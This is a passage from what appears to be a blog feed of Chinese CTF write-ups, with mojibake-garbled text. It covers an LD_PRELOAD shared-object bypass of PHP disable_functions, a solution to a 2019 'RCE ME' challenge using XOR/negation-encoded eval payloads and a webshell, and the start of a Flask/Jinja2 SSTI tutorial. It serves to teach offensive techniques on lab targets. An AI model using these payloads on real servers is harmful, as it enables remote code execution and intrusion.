unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>ç„¶åç¼–è¯‘ä¸€ä¸‹</p><pre><code>gcc -c -fPIC sky.c -o skygcc --share sky -o sky.so</code></pre><p>æµ‹è¯•ä¸€ä¸‹</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./sky.so&quot;);$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>è¿è¡Œå‘ç°</p><pre><code>root@sky:~# php sky.phpbin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.oldPHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-25528VpF8npGTawCz.pam&#39;: No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3Stack trace:#0 /root/sky.php(3): Imagick-&gt;__construct(&#39;sky.wmv&#39;)#1 &#123;main&#125;  thrown in /root/sky.php on line 3</code></pre><p>æˆ‘ä»¬æˆåŠŸçš„è¿›è¡Œäº†åˆ—ç›®å½•</p><p>è¿™é‡Œä¸²ä¸€ä¸‹æ€è·¯ï¼š</p><p>é¦–å…ˆæ‰§è¡Œsky.php ,è®¾ç½®äº†æ¶æ„ç¯å¢ƒå˜é‡ã€‚ä¸‹ä¸€æ­¥æˆ‘ä»¬éœ€è¦è°ƒç”¨å­è¿›ç¨‹æ¥åŠ è½½ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¼šä½¿ç”¨new imagick(â€˜sky.wmvâ€™),è°ƒç”¨äº†ffmpegè¿™ä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹åœ¨åŠ è½½ä¹‹å‰å°±è°ƒç”¨äº†ç¯å¢ƒå˜é‡ï¼ŒåŠ è½½äº†å…±äº«å¯¹è±¡sky.so.åŠ è½½å®Œåå®ƒä¼šè‡ªåŠ¨æ‰§è¡Œ__attribute__ ((<strong>constructor</strong>)),å°±ä¼šè°ƒç”¨systemå‘½ä»¤ã€‚</p><h2 id="getflagæµç¨‹"><a href="#getflagæµç¨‹" class="headerlink" title="getflagæµç¨‹:"></a>getflagæµç¨‹:</h2><p>é‚£ä¹ˆç°åœ¨æ€è·¯å¾ˆæ¸…æ™°ï¼š</p><p>1.æŠŠæˆ‘ä»¬çš„sky.soå’Œsky.wmvä¸Šä¼ åˆ°é¢˜ç›®çš„/tmp/sandboxä¸­</p><p>2.åˆ©ç”¨backdoorè¿è¡Œsky.php</p><p>3.åœ¨tmpç›®å½•è¯»å–é‡å®šå‘çš„ç»“æœ</p><p>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a> ï¼ˆè†œæ‹œå¤§ä½¬ï¼ŒåŸºæœ¬éƒ½æ˜¯æ¬è¿‡æ¥çš„ï¼Œè‡ªå·±çš„ä»£ç åŠŸåº•å¤ªå¼±ï¼Œå¤§ä½¬è®²çš„åˆéå¸¸å¥½å°±æ¬è¿äº†ä¸€ä¸‹ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜ 2019 RCE ME __0X01-0X0F</title>
      <link href="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/"/>
      <url>/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/</url>
      
        <content type="html"><![CDATA[<h1 id="æ‰“å¼€é¢˜ç›®ï¼Œæºç å¦‚å›¾ï¼Œçœ‹èµ·æ¥å¾ˆç®€å•ï¼š"><a href="#æ‰“å¼€é¢˜ç›®ï¼Œæºç å¦‚å›¾ï¼Œçœ‹èµ·æ¥å¾ˆç®€å•ï¼š" class="headerlink" title="æ‰“å¼€é¢˜ç›®ï¼Œæºç å¦‚å›¾ï¼Œçœ‹èµ·æ¥å¾ˆç®€å•ï¼š"></a>æ‰“å¼€é¢˜ç›®ï¼Œæºç å¦‚å›¾ï¼Œçœ‹èµ·æ¥å¾ˆç®€å•ï¼š</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</code></pre><p>é‡ç‚¹å…³æ³¨ preg_match() å‡½æ•°ï¼Œå®ƒå°†æ‰€æœ‰çš„å­—æ¯å’Œæ•°å­—éƒ½è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•é€šè¿‡$codeç›´æ¥ä¼ å…¥å‘½ä»¤ï¼Œå› æ­¤éœ€è¦ç»•è¿‡ã€‚</p><p>æœ€å¸¸ç”¨çš„å°±æ˜¯å–åç»•è¿‡ã€‚</p><p>å…ˆå–phpinfoæ¥æµ‹è¯•ä¸€ä¸‹</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143439534.png" alt="image-20211018143439534"></p><p>ä¸ºä»€ä¹ˆè¦åŠ urlencode()ï¼Ÿè¿™é‡Œæ˜¯å› ä¸ºå­—ç¬¦ä¸²å–ååä¼šå˜æˆæ— æ³•è¯†åˆ«çš„å­—ç¬¦ï¼Œè€Œè¿™ä¹Ÿæ˜¯èƒ½ç»•è¿‡preg_match()å‡½æ•°çš„åŸå› ã€‚</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143653122.png" alt="image-20211018143653122"></p><p>æˆåŠŸå¾—åˆ°ä¿¡æ¯ã€‚</p><p>ä¸‹ä¸€æ­¥è€ƒè™‘é€šè¿‡å–åæ¥æ„å»ºwebshellã€‚</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143038799.png" alt="image-20211018143038799"></p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143850709.png" alt="image-20211018143850709"></p><p>æµ‹è¯•ä¸€ä¸‹webshellæ˜¯å¦æœ‰æ•ˆï¼š</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144115367.png" alt="image-20211018144115367"></p><p>æˆåŠŸï¼Œä½¿ç”¨èšå‰‘æ¥è¿æ¥ä¸€ä¸‹ã€‚</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144244347.png" alt="image-20211018144244347"></p><p>è¿æ¥æˆåŠŸã€‚</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144318564.png" alt="image-20211018144318564"></p><p>åœ¨æ ¹ç›®å½•å‘ç°äº†readflagå’Œflagï¼Œæ ¹æ®ç»éªŒæ˜¯è¦æˆ‘ä»¬æ‰§è¡Œreadflagæ¥è·å–åˆ°flagã€‚</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144428698.png" alt="image-20211018144428698"></p><p>è¿™æ—¶å€™å°±æ‡µé€¼äº†ï¼Œå‘½ä»¤æ— æ³•æ‰§è¡Œæ˜¯ä¸€ä¸ªåºŸshellã€‚</p><p>è®©æˆ‘ä»¬å†ä¼šåˆ°phpinfo()ä»”ç»†è§‚å¯Ÿï¼Œå‘ç°å¦‚ä¸‹ï¼š</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143523288.png" alt="image-20211018143523288"></p><p>æ•æ„Ÿå‡½æ•°åŸºæœ¬å…¨è¢«ç¦ç”¨äº†ã€‚</p><p>é‚£æˆ‘ä»¬å°±è¦ç»•è¿‡disable_functionsæ¥æ‰§è¡Œreadflagæ–‡ä»¶äº†ã€‚</p><h2 id="èšå‰‘ä¸­æœ‰ä¸€ä¸ªæ’ä»¶å¯ä»¥ç»•è¿‡disable-functions-éé¢„æœŸè§£æ³•"><a href="#èšå‰‘ä¸­æœ‰ä¸€ä¸ªæ’ä»¶å¯ä»¥ç»•è¿‡disable-functions-éé¢„æœŸè§£æ³•" class="headerlink" title="èšå‰‘ä¸­æœ‰ä¸€ä¸ªæ’ä»¶å¯ä»¥ç»•è¿‡disable_functions(éé¢„æœŸè§£æ³•)"></a>èšå‰‘ä¸­æœ‰ä¸€ä¸ªæ’ä»¶å¯ä»¥ç»•è¿‡disable_functions(éé¢„æœŸè§£æ³•)</h2><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144830831.png" alt="image-20211018144830831"></p><p>å¯ç”¨æ’ä»¶ï¼Œé€‰æ‹©</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145031532.png" alt="image-20211018145031532"></p><p>å‘ç°æˆåŠŸç»•è¿‡ï¼Œå¹¶æ‰§è¡Œreadflagæ–‡ä»¶è·å–åˆ°äº†flag</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145133785.png" alt="image-20211018145133785"></p><h2 id="é€šè¿‡LD-PRELOADä¸putenvæ¥æ‰§è¡Œå‘½ä»¤"><a href="#é€šè¿‡LD-PRELOADä¸putenvæ¥æ‰§è¡Œå‘½ä»¤" class="headerlink" title="é€šè¿‡LD_PRELOADä¸putenvæ¥æ‰§è¡Œå‘½ä»¤"></a>é€šè¿‡LD_PRELOADä¸putenvæ¥æ‰§è¡Œå‘½ä»¤</h2><p>åŸºæœ¬æ€è·¯ï¼š</p><p>åˆ©ç”¨linuxæä¾›çš„LD_preloadç¯å¢ƒå˜é‡ï¼ŒåŠ«æŒå…±äº«soï¼Œåœ¨å¯åŠ¨å­è¿›ç¨‹çš„æ—¶å€™ï¼Œæ–°çš„å­è¿›ç¨‹ä¼šåŠ è½½æˆ‘ä»¬æ¶æ„çš„soæ‹“å±•ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨soé‡Œé¢å®šä¹‰åŒåå‡½æ•°ï¼Œå³å¯åŠ«æŒAPIè°ƒç”¨ï¼ŒæˆåŠŸRCEã€‚åœ¨å¦ä¸€ç¯‡åšå®¢ä¸­æˆ‘ä¼šè¯¦ç»†çš„ä»‹ç»ä¸‹è¿™ä¸ªï¼Œè¿™é‡Œä¸åšæ·±å…¥è®¨è®ºã€‚</p><p>å‘ç°/var/tmpç›®å½•ä¸‹æœ‰ä¸Šä¼ æƒé™ï¼Œä¸Šä¼ expï¼Œ<img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019221359870.png" alt="image-20211019221359870"></p><p>bypass_disablefunc.php ä¸ºå‘½ä»¤æ‰§è¡Œ webshellï¼Œæä¾›ä¸‰ä¸ª GET å‚æ•°ï¼š</p><pre><code>http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</code></pre><p>ç”±äºåœ¨æœ¬é¢˜ä¸­å¯¹codeæœ‰å­—ç¬¦æ•°é‡çš„é™åˆ¶ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹æˆ‘ä»¬çš„payloadä¸ºå¼‚æˆ–ï¼š</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019230656350.png" alt="image-20211019230656350"></p><pre><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/shell.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><pre><code>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#39;a&#39;])</code></pre><pre><code>http://543c3847-4a06-4587-b8a5-7be27d7b7d7d.node4.buuoj.cn:81/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/xx&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019225739892.png" alt="image-20211019225739892"></p><p>çœ‹ç½‘ä¸Šçš„å¤§å¤šæ•°æ˜¯ç¬¬ä¸€ç§è§£æ³•ï¼Œæ„Ÿè§‰å¤§å®¶éƒ½å¤ªæµ®èºï¼Œæˆ‘ä¹Ÿä¸ä¾‹å¤–ã€‚ä¸èƒ½ä¸ºäº†åˆ·é¢˜è€Œåˆ·é¢˜ã€‚æŒæ¡çŸ¥è¯†ç‚¹å’Œæ–¹æ³•ï¼Œæ‰èƒ½åœ¨é‡åˆ°ç›¸ä¼¼é¢˜ç›®æ—¶èƒ½å¤ŸåŠæ—¶å†™å‡ºæ¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti-flakæ¡†æ¶</title>
      <link href="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/"/>
      <url>/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆå§‹sstiæ¼æ´"><a href="#åˆå§‹sstiæ¼æ´" class="headerlink" title="åˆå§‹sstiæ¼æ´"></a>åˆå§‹sstiæ¼æ´</h1><blockquote><p>SSTI(Server-Side Template Injection) æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå°±æ˜¯æœåŠ¡å™¨æ¨¡æ¿ä¸­æ‹¼æ¥äº†æ¶æ„ç”¨æˆ·è¾“å…¥å¯¼è‡´å„ç§æ¼æ´ã€‚é€šè¿‡æ¨¡æ¿ï¼ŒWebåº”ç”¨å¯ä»¥æŠŠè¾“å…¥è½¬æ¢æˆç‰¹å®šçš„HTMLæ–‡ä»¶æˆ–è€…emailæ ¼å¼</p></blockquote><p><strong>SSTI</strong>ï¼Œ<strong>æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</strong>(Server-Side Template Injection)</p><ul><li>æœåŠ¡ç«¯æ¥æ”¶æ”»å‡»è€…çš„è¾“å…¥ï¼Œå°†å…¶ä½œä¸ºWebåº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†</li><li>åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œè¿›è¡Œäº†è¯­å¥çš„æ‹¼æ¥ï¼Œæ‰§è¡Œäº†æ‰€æ’å…¥çš„æ¶æ„å†…å®¹</li><li>ä»è€Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShellç­‰é—®é¢˜</li><li>å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§</li><li><strong>æ³¨æ„</strong>ï¼šæ¨¡æ¿å¼•æ“ å’Œ æ¸²æŸ“å‡½æ•° æœ¬èº«æ˜¯æ²¡æœ‰æ¼æ´çš„ , è¯¥æ¼æ´çš„äº§ç”ŸåŸå› åœ¨äºç¨‹åºå‘˜å¯¹ä»£ç çš„ä¸ä¸¥ç¦ä¸ä¸è§„èŒƒ , å¯¼è‡´äº†æ¨¡æ¿å¯æ§ , ä»è€Œå¼•å‘ä»£ç æ³¨å…¥</li></ul><p>sstiæ¼æ´å…¶å®æœ‰å¾ˆå¤šç§ï¼Œå› ä¸ºä¸åŒçš„æ¡†æ¶è¯­æ³•ä¸åŒï¼Œæ‰€ä»¥å‘¢ï¼Œæˆ‘ä»¬æ³¨å…¥çš„æ—¶å€™è¿˜è¦åˆ¤æ–­æ˜¯ä»€ä¹ˆæ¡†æ¶</p><p>ä¸»è¦çš„æ¨¡æ¿è¯­è¨€ï¼ˆæˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„æ˜¯flaskï¼‰</p><ul><li>Pythonï¼šflaskã€ makoã€ tornadoã€ django</li><li>phpï¼šsmartyã€ twig</li><li>javaï¼šjadeã€ velocity</li></ul><p>è¿™æ¬¡æˆ‘ä»¬ä»‹ç»çš„å¸¸ç”¨çš„flaskæ¡†æ¶ï¼Œå¸¸ç”¨çš„è¯­è¨€ä¸ºjinjia2ã€‚</p><h2 id="è·¯ç”±"><a href="#è·¯ç”±" class="headerlink" title="è·¯ç”±"></a>è·¯ç”±</h2><p>å…ˆçœ‹ä¸€æ®µä»£ç </p><pre><code>from flask import flask @app.route(&#39;/index/&#39;)def hello_word():    return &#39;hello word&#39;</code></pre><p><code>route</code>è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥ã€‚ä¾‹å­ä¸­çš„ä»£ç çš„ä½œç”¨å°±æ˜¯å½“ä½ è®¿é—®<code>http://127.0.0.1ï¼š5000/index</code>çš„æ—¶å€™ï¼Œflaskä¼šè¿”å›hello wordã€‚</p><h2 id="æ¸²æŸ“æ–¹æ³•"><a href="#æ¸²æŸ“æ–¹æ³•" class="headerlink" title="æ¸²æŸ“æ–¹æ³•"></a>æ¸²æŸ“æ–¹æ³•</h2><p>flaskçš„æ¸²æŸ“æ–¹æ³•æœ‰render_templateå’Œrender_template_stringä¸¤ç§ã€‚</p><p>render_template()æ˜¯ç”¨æ¥æ¸²æŸ“ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶çš„ã€‚ä½¿ç”¨å¦‚ä¸‹</p><pre><code>return render_template(&#39;index.html&#39;)</code></pre><p>render_template_stringåˆ™æ˜¯ç”¨æ¥æ¸²æŸ“ä¸€ä¸ªå­—ç¬¦ä¸²çš„ã€‚SSTIä¸è¿™ä¸ªæ–¹æ³•å¯†ä¸å¯åˆ†ã€‚</p><p>ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p><pre><code>html = &#39;&lt;h1&gt;This is index page&lt;/h1&gt;&#39;return render_template_string(html)</code></pre><h2 id="æ¨¡æ¿"><a href="#æ¨¡æ¿" class="headerlink" title="æ¨¡æ¿"></a>æ¨¡æ¿</h2><p>flaskæ˜¯ä½¿ç”¨Jinja2æ¥ä½œä¸ºæ¸²æŸ“å¼•æ“çš„ã€‚çœ‹ä¾‹å­</p><p>åœ¨ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹æ–°å»º<code>templates</code>æ–‡ä»¶å¤¹ï¼Œè¿™é‡Œæ˜¯ç”¨æ¥å­˜æ”¾htmlæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯æ¨¡æ¿æ–‡ä»¶ã€‚</p><p>test.py</p><pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string@app.route(&#39;/index/&#39;)def user_login():    return render_template(&#39;index.html&#39;)</code></pre><p>/templates/index.html</p><pre><code>&lt;h1&gt;This is index page&lt;/h1&gt;</code></pre><p>è®¿é—®<code>127.0.0.1:5000/index/</code>çš„æ—¶å€™ï¼Œflaskå°±ä¼šæ¸²æŸ“å‡ºindex.htmlçš„é¡µé¢ã€‚</p><p>æ¨¡æ¿æ–‡ä»¶å¹¶ä¸æ˜¯å•çº¯çš„htmlä»£ç ï¼Œè€Œæ˜¯å¤¹æ‚ç€æ¨¡æ¿çš„è¯­æ³•ï¼Œå› ä¸ºé¡µé¢ä¸å¯èƒ½éƒ½æ˜¯ä¸€ä¸ªæ ·å­çš„ï¼Œæœ‰ä¸€äº›åœ°æ–¹æ˜¯ä¼šå˜åŒ–çš„ã€‚æ¯”å¦‚è¯´æ˜¾ç¤ºç”¨æˆ·åçš„åœ°æ–¹ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨æ¨¡æ¿æ”¯æŒçš„è¯­æ³•ï¼Œæ¥ä¼ å‚ã€‚</p><p>ä¾‹å­</p><p>test.py</p><pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string@app.route(&#39;/index/&#39;)def user_login():    return render_template(&#39;index.html&#39;,content=&#39;This is index page.&#39;)</code></pre><p>/templates/index.html</p><pre><code>&lt;h1&gt;&#123;&#123;content&#125;&#125;&lt;/h1&gt;</code></pre><p>è¿™ä¸ªæ—¶å€™é¡µé¢ä»ç„¶è¾“å‡º<code>This is index page</code>ã€‚</p><p>ä¸æ­£ç¡®çš„ä½¿ç”¨flaskä¸­çš„<code>render_template_string</code>æ–¹æ³•ä¼šå¼•å‘SSTIã€‚é‚£ä¹ˆæ˜¯ä»€ä¹ˆä¸æ­£ç¡®çš„ä»£ç å‘¢ï¼Ÿ</p><h2 id="xssåˆ©ç”¨"><a href="#xssåˆ©ç”¨" class="headerlink" title="xssåˆ©ç”¨"></a>xssåˆ©ç”¨</h2><p>å­˜åœ¨æ¼æ´çš„ä»£ç </p><pre><code class="python">@app.route(&#39;/test/&#39;)def test():    code = request.args.get(&#39;id&#39;)    html = &#39;&#39;&#39;        &lt;h3&gt;%s&lt;/h3&gt;    &#39;&#39;&#39;%(code)    return render_template_string(html)</code></pre><p>è¿™æ®µä»£ç å­˜åœ¨æ¼æ´çš„åŸå› æ˜¯æ•°æ®å’Œä»£ç çš„æ··æ·†ã€‚ä»£ç ä¸­çš„<code>code</code>æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œä¼šå’Œhtmlæ‹¼æ¥åç›´æ¥å¸¦å…¥æ¸²æŸ“ã€‚</p><p>å°è¯•æ„é€ codeä¸ºä¸€ä¸²jsä»£ç ã€‚</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787703_5bd68df77bdf5.png!small" alt="1.png"></p><p>å°†ä»£ç æ”¹ä¸ºå¦‚ä¸‹</p><pre><code class="python">@app.route(&#39;/test/&#39;)def test():    code = request.args.get(&#39;id&#39;)    return render_template_string(&#39;&lt;h1&gt;&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#39;,code=code)</code></pre><p>ç»§ç»­å°è¯•</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787852_5bd68e8c570a5.png!small" alt="2.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œjsä»£ç è¢«åŸæ ·è¾“å‡ºäº†ã€‚è¿™æ˜¯å› ä¸ºæ¨¡æ¿å¼•æ“ä¸€èˆ¬éƒ½é»˜è®¤å¯¹æ¸²æŸ“çš„å˜é‡å€¼è¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œè¿™æ ·å°±ä¸ä¼šå­˜åœ¨xssäº†ã€‚åœ¨è¿™æ®µä»£ç ä¸­ç”¨æˆ·æ‰€æ§çš„æ˜¯codeå˜é‡ï¼Œè€Œä¸æ˜¯æ¨¡æ¿å†…å®¹ã€‚å­˜åœ¨æ¼æ´çš„ä»£ç ä¸­ï¼Œæ¨¡æ¿å†…å®¹ç›´æ¥å—ç”¨æˆ·æ§åˆ¶çš„ã€‚</p><p>æ¨¡æ¿æ³¨å…¥å¹¶ä¸å±€é™äºxssï¼Œå®ƒè¿˜å¯ä»¥è¿›è¡Œå…¶ä»–æ”»å‡»ã€‚</p><h1 id="SSTIæ–‡ä»¶è¯»å–-å‘½ä»¤æ‰§è¡Œ"><a href="#SSTIæ–‡ä»¶è¯»å–-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="SSTIæ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ"></a>SSTIæ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>åœ¨Jinja2æ¨¡æ¿å¼•æ“ä¸­ï¼Œ<code>&#123;&#123;&#125;&#125;`æ˜¯å˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ã€‚`&#123;&#123;&#125;&#125;</code>å¹¶ä¸ä»…ä»…å¯ä»¥ä¼ é€’å˜é‡ï¼Œè¿˜å¯ä»¥æ‰§è¡Œä¸€äº›ç®€å•çš„è¡¨è¾¾å¼ã€‚</p><p>è¿™é‡Œè¿˜æ˜¯ç”¨ä¸Šæ–‡ä¸­å­˜åœ¨æ¼æ´çš„ä»£ç </p><pre><code class="python">@app.route(&#39;/test/&#39;)def test():    code = request.args.get(&#39;id&#39;)    html = &#39;&#39;&#39;        &lt;h3&gt;%s&lt;/h3&gt;    &#39;&#39;&#39;%(code)    return render_template_string(html)</code></pre><p>æ„é€ å‚æ•°<code>&#123;&#123;2*4&#125;&#125;</code>ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787878_5bd68ea683cce.png!small" alt="3.png">å¯ä»¥çœ‹åˆ°è¡¨è¾¾å¼è¢«æ‰§è¡Œäº†ã€‚</p><p>åœ¨flaskä¸­ä¹Ÿæœ‰ä¸€äº›å…¨å±€å˜é‡ã€‚<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787904_5bd68ec05001a.png!small" alt="4.png"></p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><p>çœ‹äº†å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œæ˜¯é€šè¿‡pythonçš„å¯¹è±¡çš„ç»§æ‰¿æ¥ä¸€æ­¥æ­¥å®ç°æ–‡ä»¶è¯»å–å’Œå‘½ä»¤æ‰§è¡Œçš„çš„ã€‚é¡ºç€å¸ˆå‚…ä»¬çš„æ€è·¯ï¼Œå†ç†ä¸€éã€‚</p><p>æ‰¾åˆ°çˆ¶ç±»<code>&lt;type &#39;object&#39;&gt;</code>â€“&gt;å¯»æ‰¾å­ç±»â€“&gt;æ‰¾å…³äºå‘½ä»¤æ‰§è¡Œæˆ–è€…æ–‡ä»¶æ“ä½œçš„æ¨¡å—ã€‚</p><p>å‡ ä¸ªé­”æœ¯æ–¹æ³•</p><pre><code class="python">__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚__base__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨</code></pre><p>1 ã€è·å–å­—ç¬¦ä¸²çš„ç±»å¯¹è±¡</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;</code></pre><p>2 ã€å¯»æ‰¾åŸºç±»</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</code></pre><p>3 ã€å¯»æ‰¾å¯ç”¨å¼•ç”¨</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type 